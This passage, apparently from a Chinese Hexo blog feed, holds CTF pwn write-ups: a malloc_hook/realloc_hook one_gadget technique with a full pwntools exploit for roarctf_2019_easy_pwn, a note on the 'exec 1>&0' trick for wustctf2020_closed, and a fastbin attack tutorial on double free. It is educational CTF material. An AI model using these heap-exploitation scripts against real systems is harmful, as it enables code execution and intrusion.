class="hljs-symbol">.text:</span>00000000000846EF                 <span class="hljs-keyword">jnz</span>     loc_84960<br></code></pre></td></tr></table></figure><p>函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 <code>push xxx</code> 。</p><h3 id="malloc-hook-与-realloc-hook-配合"><a href="#malloc-hook-与-realloc-hook-配合" class="headerlink" title="malloc_hook 与 realloc_hook 配合"></a>malloc_hook 与 realloc_hook 配合</h3><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">malloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">malloc_hook</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc_hook</span> -&gt;</span> onegadget<br></code></pre></td></tr></table></figure><p>这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。</p><p>realloc 这个偏移做题还是逐个试感觉快一点，因为设想是<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的</strong> <strong><code>[rsp+0x30]=[rsp+0x38]</code></strong> ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：</p><p>原理上是：<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的</strong> **<code>[rsp+0x30]=[rsp+0x38]</code>**，但实际部分位置的值会变，所以逐个试，速度可能比计算快。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/roarctf_2019_easy_pwn">附件</a></p><p>前边就是正常的打hook</p><p>但是所以的onegadget都不能用，就要想到用malloc_hook 与 realloc_hook 配合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>url = <span class="hljs-string">&#x27;node5.buuoj.cn:26271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * $rebase(0x0000000000000D6C)</span><br><span class="hljs-string">            b * $rebase(0x0000000000000F6D)</span><br><span class="hljs-string">            b * $rebase(0x000000000000108C)</span><br><span class="hljs-string">            b * $rebase(0x00000000000011D0)</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript = gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Note system                                                                                                        </span><br><span class="hljs-string">1. create a note</span><br><span class="hljs-string">2. write note</span><br><span class="hljs-string">3. drop the note</span><br><span class="hljs-string">4. show the note</span><br><span class="hljs-string">5. exit</span><br><span class="hljs-string">choice: </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment"># add(0x10)</span><br><span class="hljs-comment">#----------------------泄露libc地址-----------------------------#</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x41</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) + <span class="hljs-number">0x09</span> , payload)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#1</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>main_arena_88 = u64(p.recv(<span class="hljs-number">0x28</span>)[-<span class="hljs-number">8</span>:])<br>success(<span class="hljs-built_in">hex</span>(main_arena_88))<br>malloc_hook = main_arena_88 - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span> , malloc_hook)<br>base_addr = malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br><br><span class="hljs-comment">#----------------------fastbin-----------------------------#</span><br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x41</span>)<br>edit(<span class="hljs-number">3</span> , <span class="hljs-built_in">len</span>(payload) + <span class="hljs-number">0x09</span> , payload)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x51</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-built_in">len</span>(payload) ,payload)<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#2</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">5</span>) <br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>success(<span class="hljs-string">&quot;malloc_hook : &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>success(<span class="hljs-string">&quot;fake_chunk : &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br><br>realloc_hook = base_addr + libc.dump(<span class="hljs-string">&#x27;realloc&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(realloc_hook))<br>one=[<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf1147</span>,<span class="hljs-number">0xf02a4</span>]//第二个偏移<span class="hljs-number">0</span>，第三个偏移<span class="hljs-number">4</span>，第四个偏移<span class="hljs-number">13</span><br>one_gadget = base_addr + one[<span class="hljs-number">3</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">11</span> + p64(one_gadget) + p64(realloc_hook + <span class="hljs-number">13</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>onegadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wustctf2020_closed</title>
    <link href="/2024/08/03/wustctf2020-closed/"/>
    <url>/2024/08/03/wustctf2020-closed/</url>
    
    <content type="html"><![CDATA[<h2 id="IDA反编译伪代码"><a href="#IDA反编译伪代码" class="headerlink" title="IDA反编译伪代码"></a>IDA反编译伪代码</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408031805202.png" alt="ida反编译"></p><h2 id="文件相关知识"><a href="#文件相关知识" class="headerlink" title="文件相关知识"></a>文件相关知识</h2><p>这题就是一个Linux命令 exec 1&gt;&amp;0</p><p>现在来解释一下</p><ul><li>close(1);close(2);</li><li>我们的目的是要得到shell，官方wp给的是此处可以输入串：$0然后可以执行新的命令exec 1&gt;&amp;0以及其他以查看到flag</li><li>那么这条语句是什么意思呢？其中的0和1是指什么呢？<ul><li>0和1是linux下的文件描述符。</li><li>在Linux中一切皆文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</li><li>标准输入输出的指向是默认的，我们可以修改它们的指向，也即重定位</li><li>举例子，可以用exec 1&gt;myoutput把标准输出重定向到myoutput文件中，也可以用exec 0&lt;myinput把标准输入重定向到myinput文件中，而且，文件名字可以用&amp;+文件描述符来代替。</li><li>那么问题到这里就解决了，三条语句中close(1);close(2)即把标准输出和标准错误输出关闭，然后我们可以执行 exec 1&gt;&amp;0，也就是把标准输出重定向到标准输入，因为默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了</li></ul></li></ul><h3 id="就是那么神奇😂"><a href="#就是那么神奇😂" class="headerlink" title="就是那么神奇😂"></a>就是那么神奇😂</h3>]]></content>
    
    
    <categories>
      
      <category>BUUCTF刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux命令</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2024/08/03/Fastbin-Attack/"/>
    <url>/2024/08/03/Fastbin-Attack/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、UAF等能控制chunk内容的漏洞</li><li>漏洞发生于fastbin类型的chunk中</li></ul><p>fastbin attack大致可以分为一下几类：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中前两个漏洞侧重利用free函数释放<strong>真的chunk或伪造的chunk</strong>。然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc申请指定位置chunk进行攻击。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-comment">//进行释放</span><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放前</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>执行三次 free 进行释放后</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602040</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Fastbins[<span class="hljs-attribute">idx</span>=2, <span class="hljs-attribute">size</span>=0x30,ptr=0x602080]<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x602040, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x602000, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x000000, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br></code></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>astbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li><li>存在UAF漏洞</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs 1c">*** Error in `./tst&#x27;: double free or corruption (fasttop): 0x<span class="hljs-number">00000000022000</span>10 ***<br>======= 